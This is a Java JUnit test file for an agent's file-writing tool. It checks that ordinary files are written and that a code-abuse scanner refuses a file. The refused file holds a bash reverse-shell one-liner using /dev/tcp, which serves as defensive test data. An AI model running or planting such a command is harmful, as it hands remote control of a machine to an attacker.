package com.navneet.executespec.tool;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;

import java.nio.file.Files;
import java.nio.file.Path;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.navneet.executespec.security.CodeAbuseScanner;
import com.navneet.executespec.sse.SseBroadcaster;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

@DisplayName("WriteFileTool")
class WriteFileToolTest {

  @TempDir Path workspace;

  private final ObjectMapper om = new ObjectMapper();
  private WriteFileTool tool;
  private ExecutionContext ctx;

  @BeforeEach
  void setUp() {
    tool =
        new WriteFileTool(
            new FileSandboxPolicy(),
            new CodeAbuseScanner(),
            mock(SseBroadcaster.class),
            new ReadFileStateStore(),
            null);
    ctx = new ExecutionContext("run-1", "T1", workspace);
  }

  private JsonNode args(String path, String content) {
    ObjectNode node = om.createObjectNode();
    node.put("path", path);
    node.put("content", content);
    return node;
  }

  @Test
  void writesCleanNewFile() throws Exception {
    ToolResult result = tool.execute(args("src/App.java", "class App {}\n"), ctx);

    assertThat(result).isInstanceOf(ToolResult.Ok.class);
    assertThat(Files.readString(workspace.resolve("src/App.java"))).isEqualTo("class App {}\n");
  }

  @Test
  void codeAbuseScanBlocksMaliciousNewFile() {
    ToolResult result =
        tool.execute(args("exploit.sh", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n"), ctx);

    assertThat(result).isInstanceOf(ToolResult.Err.class);
    assertThat(((ToolResult.Err) result).kind()).isEqualTo(ToolResult.ErrorKind.FORBIDDEN);
    assertThat(Files.exists(workspace.resolve("exploit.sh"))).isFalse();
  }
}
